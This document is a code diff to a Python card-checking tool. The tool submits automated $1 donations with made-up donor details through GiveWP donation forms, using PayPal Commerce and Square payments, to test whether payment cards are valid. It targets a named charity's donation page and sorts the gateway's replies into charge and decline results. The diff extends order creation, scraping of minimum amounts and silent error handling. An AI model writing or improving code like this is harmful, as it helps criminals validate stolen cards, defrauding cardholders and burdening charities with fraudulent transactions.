@@ -106,7 +106,7 @@ async def get_bin_info(bin_number):
         await asyncio.sleep(0.5)
     return "Unknown", "Unknown", "Unknown"
 
-# ===================== PAYPAL COMMERCE CLASS =====================
+# ===================== PAYPAL COMMERCE CLASS (FINAL) =====================
 
 class PayPalCommerce:
     def __init__(self, target_url):
@@ -154,18 +154,25 @@ class PayPalCommerce:
         return {
             'give-address1': '123 Main Street',
             'give-address2': 'Apt 4B',
+            'give_Address2': 'Apt 4B',
+            'give-address_2': 'Apt 4B',
+            'give_address2': 'Apt 4B',
+            'give_address_2': 'Apt 4B',
+            'address_2': 'Apt 4B',
+            'address2': 'Apt 4B',
             'give-city': 'New York City',
             'give-state': 'NY',
             'give-zip': '10001',
             'give-country': 'US',
             'give-phone': '2125551234',
             'address1': '123 Main Street',
-            'address2': 'Apt 4B',
             'city': 'New York City',
             'state': 'NY',
             'zip': '10001',
             'country': 'US',
             'phone': '2125551234',
+            'billing_address_2': 'Apt 4B',
+            'shipping_address_2': 'Apt 4B',
         }
     
     def get_terms_data(self):
@@ -180,15 +187,24 @@ class PayPalCommerce:
 
     def get_base_form_data(self):
         form_data = self.form_data.copy()
+        first_name = random.choice(self.first_name)
+        last_name = random.choice(self.last_name)
         form_data.update({
             'give-amount': self.minimum_amount,
             'give-currency': self.currency,
             'currency': self.currency,
             'payment-mode': 'paypal-commerce',
-            'give_first': random.choice(self.first_name),
-            'give_last': random.choice(self.last_name),
+            'give_first': first_name,
+            'give_last': last_name,
+            'first_name': first_name,
+            'last_name': last_name,
             'give_email': self.email,
+            'email': self.email,
             'give-gateway': 'paypal-commerce',
+            'give_title': 'Mr',
+            'give_company': '',
+            'give_comment': '',
+            'give_anonymous': '0',
         })
         form_data.update(self.get_address_data())
         form_data.update(self.get_terms_data())
@@ -196,24 +212,41 @@ class PayPalCommerce:
 
     def _extract_minimum_amount(self, html):
         try:
-            min_matches = re.findall(r'minimum donation amount of \$([\d.]+)', html, re.IGNORECASE)
-            if min_matches:
-                self.minimum_amount = min_matches[0]
+            patterns = [
+                r'minimum donation amount of \$([\d.]+)',
+                r'minimum donation amount of &euro;([\d.]+)',
+                r'minimum donation amount of €([\d.]+)',
+                r'minimum donation amount of £([\d.]+)',
+                r'min donation amount[:=]\s*["\']?([\d.]+)',
+                r'data-min-amount=["\']([\d.]+)["\']',
+                r'data-minimum-amount=["\']([\d.]+)["\']',
+                r'min-amount=["\']([\d.]+)["\']',
+                r'minimum_amount=["\']([\d.]+)["\']',
+                r'min_amount=["\']([\d.]+)["\']',
+                r'data-min-donation=["\']([\d.]+)["\']',
+                r'min-donation=["\']([\d.]+)["\']',
+                r'data-minimum-donation=["\']([\d.]+)["\']',
+                r'minimum-donation=["\']([\d.]+)["\']',
+            ]
+            for pattern in patterns:
+                match = re.search(pattern, html, re.IGNORECASE)
+                if match:
+                    self.minimum_amount = match.group(1)
+                    return
+            
+            min_inputs = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
+            if min_inputs:
+                self.minimum_amount = max(min_inputs, key=float)
                 return
             
-            min_matches = re.findall(r'minimum donation amount of &euro;([\d.]+)', html, re.IGNORECASE)
-            if min_matches:
-                self.minimum_amount = min_matches[0]
+            js_vars = re.findall(r'(?:var|let|const)\s+\w*(?:min|minimum)\w*\s*=\s*["\']?([\d.]+)', html, re.IGNORECASE)
+            if js_vars:
+                self.minimum_amount = max(js_vars, key=float)
                 return
             
-            min_attr = re.findall(r'data-min-amount=["\']([\d.]+)["\']', html, re.IGNORECASE)
-            if min_attr:
-                self.minimum_amount = min_attr[0]
-                return
-            
-            min_input = re.findall(r'min=["\']([\d.]+)["\']', html, re.IGNORECASE)
-            if min_input:
-                self.minimum_amount = min_input[0]
+            all_mins = re.findall(r'min(?:imum)?[^=]*=\s*["\']?([\d.]+)', html, re.IGNORECASE)
+            if all_mins:
+                self.minimum_amount = max(all_mins, key=float)
                 return
             
             self.minimum_amount = "1.00"
@@ -300,8 +333,8 @@ class PayPalCommerce:
             if response.status_code == 200:
                 self.access_token = response.json().get('access_token')
                 return self.access_token
-        except Exception as e:
-            print(f"Access token error: {e}")
+        except:
+            pass
         return None
 
     def _get_client_token(self):
@@ -336,8 +369,7 @@ class PayPalCommerce:
                     except:
                         pass
             return None
-        except Exception as e:
-            print(f"Client token error: {e}")
+        except:
             return None
 
     def _create_order(self):
@@ -349,12 +381,20 @@ class PayPalCommerce:
             order_id = self._create_order_direct()
             if order_id:
                 return order_id
+        if self.client_token:
+            order_id = self._create_order_with_client_token()
+            if order_id:
+                return order_id
         return None
 
     def _create_order_givewp(self):
         if not self.ajax_url:
             return None
-        form_data = self.get_base_form_data()
+        data_variations = [
+            self.get_base_form_data(),
+            {**self.get_base_form_data(), 'give-amount': self.donation},
+            {**self.get_base_form_data(), 'amount': self.donation},
+        ]
         headers = {
             'user-agent': self.get_next_ua(),
             'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -364,28 +404,29 @@ class PayPalCommerce:
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         }
         actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
-        for action in actions:
-            params = {'action': action}
-            try:
-                response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
-                if response.status_code == 200 and response.text:
-                    try:
-                        json_data = response.json()
-                        if 'data' in json_data:
-                            if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
-                                return json_data['data']['id']
-                            elif isinstance(json_data['data'], str):
-                                return json_data['data']
-                        if 'id' in json_data:
-                            return json_data['id']
-                        if 'order_id' in json_data:
-                            return json_data['order_id']
-                        if 'orderID' in json_data:
-                            return json_data['orderID']
-                    except:
-                        pass
-            except:
-                continue
+        for form_data in data_variations:
+            for action in actions:
+                params = {'action': action}
+                try:
+                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
+                    if response.status_code == 200 and response.text:
+                        try:
+                            json_data = response.json()
+                            if 'data' in json_data:
+                                if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
+                                    return json_data['data']['id']
+                                elif isinstance(json_data['data'], str):
+                                    return json_data['data']
+                            if 'id' in json_data:
+                                return json_data['id']
+                            if 'order_id' in json_data:
+                                return json_data['order_id']
+                            if 'orderID' in json_data:
+                                return json_data['orderID']
+                        except:
+                            pass
+                except:
+                    continue
         return None
 
     def _create_order_direct(self):
@@ -401,10 +442,7 @@ class PayPalCommerce:
             data = {
                 'intent': 'CAPTURE',
                 'purchase_units': [{
-                    'amount': {
-                        'currency_code': self.currency,
-                        'value': self.donation
-                    }
+                    'amount': {'currency_code': self.currency, 'value': self.donation}
                 }],
                 'application_context': {
                     'shipping_preference': 'NO_SHIPPING',
@@ -420,7 +458,54 @@ class PayPalCommerce:
         except:
             return None
 
+    def _create_order_with_client_token(self):
+        if not self.client_token:
+            return None
+        try:
+            headers = {
+                'authorization': f'Bearer {self.client_token}',
+                'content-type': 'application/json',
+                'user-agent': self.get_next_ua(),
+                'accept': 'application/json'
+            }
+            data = {
+                'intent': 'CAPTURE',
+                'purchase_units': [{
+                    'amount': {'currency_code': self.currency, 'value': self.donation}
+                }]
+            }
+            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=15)
+            if response.status_code in [200, 201]:
+                response_data = response.json()
+                if 'id' in response_data:
+                    return response_data['id']
+            return None
+        except:
+            return None
+
     def _approve_order(self, order_id):
+        if self.ajax_url and 'admin-ajax' in self.ajax_url:
+            result = self._approve_order_givewp(order_id)
+            if result:
+                return result
+        if self.access_token:
+            try:
+                headers = {
+                    'authorization': f'Bearer {self.access_token}',
+                    'content-type': 'application/json',
+                    'user-agent': self.get_next_ua(),
+                }
+                response = self.r.post(
+                    f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture',
+                    headers=headers,
+                    timeout=15
+                )
+                return response
+            except:
+                pass
+        return None
+
+    def _approve_order_givewp(self, order_id):
         if not self.ajax_url:
             return None
         form_data = self.get_base_form_data()
@@ -494,7 +579,6 @@ class PayPalCommerce:
                         timeout=15
                     )
                     confirm_text = confirm_res.text
-                    
                     if confirm_res.status_code == 200:
                         try:
                             confirm_json = confirm_res.json()
@@ -516,20 +600,16 @@ class PayPalCommerce:
                         if description:
                             return f"{issue}: {description}"
                         return issue
-                
                 if 'name' in confirm_json:
                     name = confirm_json.get('name', '')
                     msg = confirm_json.get('message', '')
                     if msg:
                         return f"{name}: {msg}"
                     return name
-                
                 if 'message' in confirm_json:
-                    msg = confirm_json.get('message', '')
-                    if msg:
-                        return msg
+                    return confirm_json.get('message', '')
             
-            # استخراج الرد من confirm_text
+            # استخراج من confirm_text
             if confirm_text:
                 try:
                     text_json = json.loads(confirm_text)
@@ -544,7 +624,6 @@ class PayPalCommerce:
                                 if description:
                                     return f"{issue}: {description}"
                                 return issue
-                        
                         if 'name' in text_json:
                             name = text_json.get('name', '')
                             msg = text_json.get('message', '')
@@ -553,7 +632,6 @@ class PayPalCommerce:
                             return name
                 except:
                     pass
-                
                 issue_matches = re.findall(r'"issue"\s*:\s*"([^"]+)"', confirm_text)
                 if issue_matches:
                     issue = issue_matches[0]
@@ -563,7 +641,6 @@ class PayPalCommerce:
                     if desc_matches:
                         return f"{issue}: {desc_matches[0]}"
                     return issue
-                
                 name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', confirm_text)
                 if name_matches:
                     name = name_matches[0]
@@ -578,16 +655,17 @@ class PayPalCommerce:
             
             if text:
                 text_lower = text.lower()
+                text_strip = text.strip()
                 
-                # CHARGE حقيقي
                 if 'true' in text_lower:
                     return 'CHARGE 1.0'
-                
-                # ORDER_NOT_APPROVED → Payer cannot pay
                 if 'order_not_approved' in text_lower:
                     return "Payer cannot pay for this transaction."
+                if text_strip in self.first_name + self.last_name:
+                    return "PAYER_ACTION_REQUIRED"
+                if len(text_strip) < 50 and not any(k in text_lower for k in ['error', 'declined', 'insufficient', 'approved', 'charge', 'true', 'invalid', 'amount', 'order', 'payer', 'card', 'payment']):
+                    return "PAYER_ACTION_REQUIRED"
                 
-                # استخراج الرد الفعلي
                 try:
                     approve_json = approve_res.json()
                     if isinstance(approve_json, dict):
@@ -616,15 +694,12 @@ class PayPalCommerce:
                     if issue == 'ORDER_NOT_APPROVED':
                         return "Payer cannot pay for this transaction."
                     return issue
-                
                 name_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', text)
                 if name_matches:
                     return name_matches[0]
-                
                 error_matches = re.findall(r'"error"\s*:\s*"([^"]+)"', text)
                 if error_matches:
                     return error_matches[0]
-                
                 if len(text) < 200:
                     return text
             
@@ -652,12 +727,10 @@ async def check_card_api(card_full, gateway_url):
             else:
                 if result.startswith("Error:"):
                     result = result.replace("Error:", "").strip()
-                
                 if result and result != "DECLINED":
                     return "declined", result
                 else:
                     return "declined", "Declined"
-                    
         except Exception as e:
             return "declined", f"Error: {e}"
 
@@ -847,7 +920,7 @@ def check_square_sync(card):
             return 'Error: No nonce'
         email = f'drgam{random.randint(100,999)}@gmail.com'
         donate_params = {'givewp-route': 'donate', 'givewp-route-signature': route_sig, 'givewp-route-signature-id': route_sig_id, 'givewp-route-signature-expiration': route_sig_exp}
-        donate_files = {'amount': (None, '1'), 'currency': (None, 'USD'), 'donationType': (None, 'single'), 'formId': (None, '1720'), 'gatewayId': (None, 'square'), 'firstName': (None, 'John'), 'lastName': (None, 'Doe'), 'email': (None, email), 'country': (None, 'US'), 'address1': (None, '123 Main St'), 'city': (None, 'New York'), 'state': (None, 'NY'), 'zip': (None, '10001'), 'originUrl': (None, 'https://www.andrewscenter.com/donate/'), 'isEmbed': (None, 'true'), 'embedId': (None, '1720'), 'locale': (None, 'en_US'), 'gatewayData[square-card-nonce]': (None, card_nonce)}
+        donate_files = {'amount': (None, '1'), 'currency': (None, 'USD'), 'donationType': (None, 'single'), 'formId': (None, '1720'), 'gatewayId': (None, 'square'), 'firstName': (None, 'John'), 'lastName': (None, 'Doe'), 'email': (None, email), 'country': (None, 'US'), 'address1': (None, '123 Main St'), 'address2': (None, 'Apt 4B'), 'city': (None, 'New York'), 'state': (None, 'NY'), 'zip': (None, '10001'), 'phone': (None, '2125551234'), 'originUrl': (None, 'https://www.andrewscenter.com/donate/'), 'isEmbed': (None, 'true'), 'embedId': (None, '1720'), 'locale': (None, 'en_US'), 'gatewayData[square-card-nonce]': (None, card_nonce)}
         donate_headers = {'authority': 'andrewscenter.com', 'accept': 'application/json', 'origin': 'https://www.andrewscenter.com', 'referer': 'https://www.andrewscenter.com/donate/', 'user-agent': UA}
         donate_resp = session.post('https://www.andrewscenter.com/', params=donate_params, headers=donate_headers, files=donate_files, timeout=60)
         return parse_square_response(donate_resp.text)
